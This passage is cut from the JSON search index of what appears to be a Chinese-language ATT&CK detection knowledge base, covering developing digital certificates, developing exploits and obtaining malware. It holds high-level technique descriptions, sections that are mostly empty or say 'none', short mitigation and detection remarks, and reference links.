\u521b\u5efa\u6570\u5b57\u8bc1\u4e66\u540e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u5176\u63a7\u5236\u7684\u57fa\u7840\u8bbe\u65bd\u4e0a\u5b89\u88c5\u8be5\u8bc1\u4e66\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1587-003-%E5%BC%80%E5%8F%91%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_1","text":"CS\u901a\u8fc7(CDN+\u8bc1\u4e66)powershell\u4e0a\u7ebf\u8be6\u7ec6\u7248 https://blog.csdn.net/god_zzZ/article/details/109057803","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1587-003-%E5%BC%80%E5%8F%91%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1587-003-%E5%BC%80%E5%8F%91%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1587-003-%E5%BC%80%E5%8F%91%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1587-003-%E5%BC%80%E5%8F%91%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1587-003-%E5%BC%80%E5%8F%91%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1587-003-%E5%BC%80%E5%8F%91%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1587-003-%E5%BC%80%E5%8F%91%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_8","text":"\u8003\u8651\u4f7f\u7528\u53ef\u80fd\u6709\u52a9\u4e8e\u8ddf\u8e2aInternet\u7ad9\u70b9\u4e0a\u4f7f\u7528\u7684\u8bc1\u4e66\u7684\u670d\u52a1\u3002\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ef\u80fd\u4f1a\u4ee5\u5df2\u77e5\u7684\u8bc1\u4e66\u4fe1\u606f\u4e3a\u4e2d\u5fc3\uff0c\u4ee5\u53d1\u73b0\u5176\u4ed6\u653b\u51fb\u8005\u7684\u57fa\u7840\u8bbe\u65bd\u3002 \u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u76f8\u5173\u884c\u4e3a\u4e0a\uff0c\u4f8b\u5982Web\u534f\u8bae\u3001\u975e\u5bf9\u79f0\u52a0\u5bc6\u6216\u5b89\u88c5\u6839\u8bc1\u4e66\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1587-003-%E5%BC%80%E5%8F%91%E8%83%BD%E5%8A%9B-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6/#_9","text":"MITRE-ATT&CK-T1587-003 https://attack.mitre.org/techniques/T1587/003/ CS\u901a\u8fc7(CDN+\u8bc1\u4e66)powershell\u4e0a\u7ebf\u8be6\u7ec6\u7248 https://blog.csdn.net/god_zzZ/article/details/109057803","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1587-004-%E5%BC%80%E5%8F%91%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/","text":"T1587-004-\u5f00\u53d1\u80fd\u529b-\u6f0f\u6d1e\u5229\u7528 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5f00\u53d1\u53ef\u5728\u653b\u51fb\u76ee\u6807\u671f\u95f4\u4f7f\u7528\u7684\u6f0f\u6d1e\u3002\u6f0f\u6d1e\u5229\u7528\u4e86\u4e00\u4e2a\u9519\u8bef\u6216\u6f0f\u6d1e\uff0c\u4ee5\u4f7f\u8ba1\u7b97\u673a\u786c\u4ef6\u6216\u8f6f\u4ef6\u53d1\u751f\u975e\u9884\u671f\u6216\u610f\u6599\u4e4b\u5916\u7684\u884c\u4e3a\u3002\u4e0e\u5176\u4ece\u7f51\u4e0a\u5bfb\u627e\uff0c\u4fee\u6539\u6f0f\u6d1e\u6216\u4ece\u6f0f\u6d1e\u4f9b\u5e94\u5546\u90a3\u91cc\u8d2d\u4e70\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u81ea\u884c\u6316\u6398\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u901a\u8fc7\u6f0f\u6d1e\u83b7\u5f97\u7684\u4fe1\u606f\u6765\u96c6\u4e2d\u5f00\u53d1\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\u3002\u4f5c\u4e3a\u6f0f\u6d1e\u5229\u7528\u5f00\u53d1\u8fc7\u7a0b\u7684\u4e00\u90e8\u5206\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u6a21\u7cca\u6d4b\u8bd5\u548c\u8865\u4e01\u5206\u6790\u7b49\u65b9\u6cd5\u53d1\u73b0\u53ef\u5229\u7528\u7684\u6f0f\u6d1e\u3002 \u4e0e\u5408\u6cd5\u7684\u5f00\u53d1\u5de5\u4f5c\u4e00\u6837\uff0c\u5f00\u53d1\u6f0f\u6d1e\u53ef\u80fd\u9700\u8981\u4e0d\u540c\u7684\u6280\u80fd\u3002\u6240\u9700\u7684\u6280\u80fd\u53ef\u80fd\u4f4d\u4e8e\u5185\u90e8\uff0c\u4e5f\u53ef\u80fd\u9700\u8981\u5916\u5305\u3002\u4f7f\u7528\u627f\u5305\u5546\u53ef\u4ee5\u88ab\u8ba4\u4e3a\u662f\u8be5\u653b\u51fb\u8005\u5f00\u53d1\u80fd\u529b\u7684\u6269\u5c55\uff0c\u53ea\u8981\u653b\u51fb\u8005\u5728\u5236\u5b9a\u8981\u6c42\u65b9\u9762\u53d1\u6325\u4f5c\u7528\uff0c\u5e76\u4fdd\u6301\u5bf9\u6f0f\u6d1e\u7684\u72ec\u6709\u6027\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u5404\u4e2a\u9636\u6bb5\u4f7f\u7528\u6f0f\u6d1e\u5229\u7528\uff08\u5373\u5229\u7528\u9762\u5411\u516c\u4f17\u7684\u5e94\u7528\u7a0b\u5e8f\u3001\u5229\u7528\u5ba2\u6237\u7aef\u6267\u884c\u3001\u5229\u7528\u7279\u6743\u5347\u7ea7\u3001\u5229\u7528\u9632\u5fa1\u89c4\u907f\u3001\u5229\u7528\u51ed\u636e\u8bbf\u95ee\u3001\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\u4ee5\u53ca\u5229\u7528\u5e94\u7528\u7a0b\u5e8f\u6216\u7cfb\u7edf\u5229\u7528\uff09\u3002 \u6d4b\u8bd5\u6848\u4f8b \u65e0 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u5927\u591a\u96c6\u4e2d\u5728\u4e0e\u4f7f\u7528\u6f0f\u6d1e\u6709\u5173\u7684\u884c\u4e3a\u4e0a\uff08\u5373\u5229\u7528\u9762\u5411\u516c\u4f17\u7684\u5e94\u7528\u7a0b\u5e8f\u3001\u5229\u7528\u5ba2\u6237\u7aef\u6267\u884c\u3001\u5229\u7528\u7279\u6743\u5347\u7ea7\u3001\u5229\u7528\u9632\u5fa1\u89c4\u907f\u3001\u5229\u7528\u51ed\u8bc1\u8bbf\u95ee\u3001\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\u3001\u4ee5\u53ca\u5e94\u7528\u6216\u7cfb\u7edf\u6f0f\u6d1e\uff09\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1587-004 https://attack.mitre.org/techniques/T1587/004/","title":"T1587-004-\u5f00\u53d1\u80fd\u529b-\u6f0f\u6d1e\u5229\u7528"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1587-004-%E5%BC%80%E5%8F%91%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#t1587-004-","text":"","title":"T1587-004-\u5f00\u53d1\u80fd\u529b-\u6f0f\u6d1e\u5229\u7528"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1587-004-%E5%BC%80%E5%8F%91%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5f00\u53d1\u53ef\u5728\u653b\u51fb\u76ee\u6807\u671f\u95f4\u4f7f\u7528\u7684\u6f0f\u6d1e\u3002\u6f0f\u6d1e\u5229\u7528\u4e86\u4e00\u4e2a\u9519\u8bef\u6216\u6f0f\u6d1e\uff0c\u4ee5\u4f7f\u8ba1\u7b97\u673a\u786c\u4ef6\u6216\u8f6f\u4ef6\u53d1\u751f\u975e\u9884\u671f\u6216\u610f\u6599\u4e4b\u5916\u7684\u884c\u4e3a\u3002\u4e0e\u5176\u4ece\u7f51\u4e0a\u5bfb\u627e\uff0c\u4fee\u6539\u6f0f\u6d1e\u6216\u4ece\u6f0f\u6d1e\u4f9b\u5e94\u5546\u90a3\u91cc\u8d2d\u4e70\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u81ea\u884c\u6316\u6398\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u901a\u8fc7\u6f0f\u6d1e\u83b7\u5f97\u7684\u4fe1\u606f\u6765\u96c6\u4e2d\u5f00\u53d1\u6f0f\u6d1e\u5229\u7528\u5de5\u5177\u3002\u4f5c\u4e3a\u6f0f\u6d1e\u5229\u7528\u5f00\u53d1\u8fc7\u7a0b\u7684\u4e00\u90e8\u5206\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u901a\u8fc7\u6a21\u7cca\u6d4b\u8bd5\u548c\u8865\u4e01\u5206\u6790\u7b49\u65b9\u6cd5\u53d1\u73b0\u53ef\u5229\u7528\u7684\u6f0f\u6d1e\u3002 \u4e0e\u5408\u6cd5\u7684\u5f00\u53d1\u5de5\u4f5c\u4e00\u6837\uff0c\u5f00\u53d1\u6f0f\u6d1e\u53ef\u80fd\u9700\u8981\u4e0d\u540c\u7684\u6280\u80fd\u3002\u6240\u9700\u7684\u6280\u80fd\u53ef\u80fd\u4f4d\u4e8e\u5185\u90e8\uff0c\u4e5f\u53ef\u80fd\u9700\u8981\u5916\u5305\u3002\u4f7f\u7528\u627f\u5305\u5546\u53ef\u4ee5\u88ab\u8ba4\u4e3a\u662f\u8be5\u653b\u51fb\u8005\u5f00\u53d1\u80fd\u529b\u7684\u6269\u5c55\uff0c\u53ea\u8981\u653b\u51fb\u8005\u5728\u5236\u5b9a\u8981\u6c42\u65b9\u9762\u53d1\u6325\u4f5c\u7528\uff0c\u5e76\u4fdd\u6301\u5bf9\u6f0f\u6d1e\u7684\u72ec\u6709\u6027\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u7684\u5404\u4e2a\u9636\u6bb5\u4f7f\u7528\u6f0f\u6d1e\u5229\u7528\uff08\u5373\u5229\u7528\u9762\u5411\u516c\u4f17\u7684\u5e94\u7528\u7a0b\u5e8f\u3001\u5229\u7528\u5ba2\u6237\u7aef\u6267\u884c\u3001\u5229\u7528\u7279\u6743\u5347\u7ea7\u3001\u5229\u7528\u9632\u5fa1\u89c4\u907f\u3001\u5229\u7528\u51ed\u636e\u8bbf\u95ee\u3001\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\u4ee5\u53ca\u5229\u7528\u5e94\u7528\u7a0b\u5e8f\u6216\u7cfb\u7edf\u5229\u7528\uff09\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1587-004-%E5%BC%80%E5%8F%91%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_1","text":"\u65e0","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1587-004-%E5%BC%80%E5%8F%91%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1587-004-%E5%BC%80%E5%8F%91%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1587-004-%E5%BC%80%E5%8F%91%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1587-004-%E5%BC%80%E5%8F%91%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1587-004-%E5%BC%80%E5%8F%91%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1587-004-%E5%BC%80%E5%8F%91%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1587-004-%E5%BC%80%E5%8F%91%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_8","text":"\u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u5927\u591a\u96c6\u4e2d\u5728\u4e0e\u4f7f\u7528\u6f0f\u6d1e\u6709\u5173\u7684\u884c\u4e3a\u4e0a\uff08\u5373\u5229\u7528\u9762\u5411\u516c\u4f17\u7684\u5e94\u7528\u7a0b\u5e8f\u3001\u5229\u7528\u5ba2\u6237\u7aef\u6267\u884c\u3001\u5229\u7528\u7279\u6743\u5347\u7ea7\u3001\u5229\u7528\u9632\u5fa1\u89c4\u907f\u3001\u5229\u7528\u51ed\u8bc1\u8bbf\u95ee\u3001\u5229\u7528\u8fdc\u7a0b\u670d\u52a1\u3001\u4ee5\u53ca\u5e94\u7528\u6216\u7cfb\u7edf\u6f0f\u6d1e\uff09\u3002","title":"\u68c0\u6d4b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1587-004-%E5%BC%80%E5%8F%91%E8%83%BD%E5%8A%9B-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#_9","text":"MITRE-ATT&CK-T1587-004 https://attack.mitre.org/techniques/T1587/004/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-001-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/","text":"T1588-001-\u83b7\u53d6\u80fd\u529b-\u6076\u610f\u8f6f\u4ef6 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8d2d\u4e70\u3001\u7a83\u53d6\u6216\u4e0b\u8f7d\u53ef\u5728\u653b\u51fb\u76ee\u6807\u8fc7\u7a0b\u4f7f\u7528\u7684\u6076\u610f\u8f6f\u4ef6\u3002\u6076\u610f\u8f6f\u4ef6\u53ef\u80fd\u5305\u62ec\u6709\u6548\u8f7d\u8377\u3001\u690d\u5165\u7a0b\u5e8f\u3001\u540e\u6e17\u900f\u5de5\u5177\u3001\u540e\u95e8\u3001\u52a0\u58f3\u7a0b\u5e8f\u548cC2\u534f\u8bae\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u83b7\u53d6\u6076\u610f\u8f6f\u4ef6\u6765\u652f\u6301\u4ed6\u4eec\u7684\u884c\u52a8\uff0c\u83b7\u5f97\u4e00\u79cd\u7ef4\u6301\u5bf9\u8fdc\u7a0b\u673a\u5668\u7684\u63a7\u5236\u3001\u9003\u907f\u9632\u5fa1\u548c\u653b\u9677\u540e\u884c\u4e3a\u7684\u624b\u6bb5\u3002 \u9664\u4e86\u4ece\u4e92\u8054\u7f51\u4e0a\u4e0b\u8f7d\u514d\u8d39\u7684\u6076\u610f\u8f6f\u4ef6\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u4ece\u7b2c\u4e09\u65b9\u5b9e\u4f53\u8d2d\u4e70\u8fd9\u4e9b\u6076\u610f\u8f6f\u4ef6\u3002\u7b2c\u4e09\u65b9\u5b9e\u4f53\u53ef\u4ee5\u5305\u62ec\u4e13\u95e8\u4ece\u4e8b\u6076\u610f\u8f6f\u4ef6\u5f00\u53d1\u7684\u6280\u672f\u516c\u53f8\u3001\u72af\u7f6a\u5e02\u573a\uff08\u5305\u62ec\u6076\u610f\u8f6f\u4ef6\u5373\u670d\u52a1\uff0c\u6216\u79f0MaaS\uff09\uff0c\u6216\u6765\u81ea\u4e2a\u4eba\u3002\u9664\u4e86\u8d2d\u4e70\u6076\u610f\u8f6f\u4ef6\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u4ece\u7b2c\u4e09\u65b9\u5b9e\u4f53\uff08\u5305\u62ec\u5176\u4ed6\u653b\u51fb\u8005\uff09\u7a83\u53d6\u548c\u91cd\u65b0\u4f7f\u7528\u6076\u610f\u8f6f\u4ef6\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6682\u65e0 \u68c0\u6d4b\u65e5\u5fd7 \u65e0\u6cd5\u6709\u6548\u76d1\u6d4b \u6d4b\u8bd5\u590d\u73b0 \u65e0 \u6d4b\u8bd5\u7559\u75d5 \u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def \u65e0 \u5efa\u8bae \u7f13\u89e3\u63aa\u65bd \u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002 \u68c0\u6d4b \u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u4e2d\u7684\u7834\u574f\u540e\u9636\u6bb5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1588-001 https://attack.mitre.org/techniques/T1588/001/","title":"T1588-001-\u83b7\u53d6\u80fd\u529b-\u6076\u610f\u8f6f\u4ef6"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-001-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#t1588-001-","text":"","title":"T1588-001-\u83b7\u53d6\u80fd\u529b-\u6076\u610f\u8f6f\u4ef6"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-001-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u8d2d\u4e70\u3001\u7a83\u53d6\u6216\u4e0b\u8f7d\u53ef\u5728\u653b\u51fb\u76ee\u6807\u8fc7\u7a0b\u4f7f\u7528\u7684\u6076\u610f\u8f6f\u4ef6\u3002\u6076\u610f\u8f6f\u4ef6\u53ef\u80fd\u5305\u62ec\u6709\u6548\u8f7d\u8377\u3001\u690d\u5165\u7a0b\u5e8f\u3001\u540e\u6e17\u900f\u5de5\u5177\u3001\u540e\u95e8\u3001\u52a0\u58f3\u7a0b\u5e8f\u548cC2\u534f\u8bae\u3002\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u83b7\u53d6\u6076\u610f\u8f6f\u4ef6\u6765\u652f\u6301\u4ed6\u4eec\u7684\u884c\u52a8\uff0c\u83b7\u5f97\u4e00\u79cd\u7ef4\u6301\u5bf9\u8fdc\u7a0b\u673a\u5668\u7684\u63a7\u5236\u3001\u9003\u907f\u9632\u5fa1\u548c\u653b\u9677\u540e\u884c\u4e3a\u7684\u624b\u6bb5\u3002 \u9664\u4e86\u4ece\u4e92\u8054\u7f51\u4e0a\u4e0b\u8f7d\u514d\u8d39\u7684\u6076\u610f\u8f6f\u4ef6\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u4ece\u7b2c\u4e09\u65b9\u5b9e\u4f53\u8d2d\u4e70\u8fd9\u4e9b\u6076\u610f\u8f6f\u4ef6\u3002\u7b2c\u4e09\u65b9\u5b9e\u4f53\u53ef\u4ee5\u5305\u62ec\u4e13\u95e8\u4ece\u4e8b\u6076\u610f\u8f6f\u4ef6\u5f00\u53d1\u7684\u6280\u672f\u516c\u53f8\u3001\u72af\u7f6a\u5e02\u573a\uff08\u5305\u62ec\u6076\u610f\u8f6f\u4ef6\u5373\u670d\u52a1\uff0c\u6216\u79f0MaaS\uff09\uff0c\u6216\u6765\u81ea\u4e2a\u4eba\u3002\u9664\u4e86\u8d2d\u4e70\u6076\u610f\u8f6f\u4ef6\u5916\uff0c\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u4ece\u7b2c\u4e09\u65b9\u5b9e\u4f53\uff08\u5305\u62ec\u5176\u4ed6\u653b\u51fb\u8005\uff09\u7a83\u53d6\u548c\u91cd\u65b0\u4f7f\u7528\u6076\u610f\u8f6f\u4ef6\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-001-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_1","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-001-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_2","text":"\u65e0\u6cd5\u6709\u6548\u76d1\u6d4b","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-001-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_3","text":"\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-001-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_4","text":"\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-001-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_5","text":"\u65e0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-001-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_6","text":"","title":"\u5efa\u8bae"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-001-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_7","text":"\u8fd9\u79cd\u6280\u672f\u4e0d\u5bb9\u6613\u7528\u9884\u9632\u63a7\u5236\u6765\u7f13\u89e3\uff0c\u56e0\u4e3a\u5b83\u662f\u57fa\u4e8e\u4f01\u4e1a\u9632\u5fa1\u548c\u63a7\u5236\u8303\u56f4\u4e4b\u5916\u7684\u884c\u4e3a\u3002","title":"\u7f13\u89e3\u63aa\u65bd"},{"location":"0x2_%E8%B5%84%E6%BA%90%E5%BC%80%E5%8F%91/T1588-001-%E8%8E%B7%E5%8F%96%E8%83%BD%E5%8A%9B-%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/#_8","text":"\u8fd9\u79cd\u6d3b\u52a8\u5927\u591a\u53d1\u751f\u5728\u76ee\u6807\u7ec4\u7ec7\u7684\u80fd\u89c1\u5ea6\u4e4b\u5916\uff0c\u4f7f\u5f97\u5bf9\u8fd9\u79cd\u884c\u4e3a\u7684\u68c0\u6d4b\u53d8\u5f97\u56f0\u96be\u3002\u68c0\u6d4b\u5de5\u4f5c\u53ef\u80fd\u96c6\u4e2d\u5728\u653b\u51fb\u751f\u547d\u5468\u671f\u4e2d\u7684\u7834\u574f\u540e\u9636\u6bb5\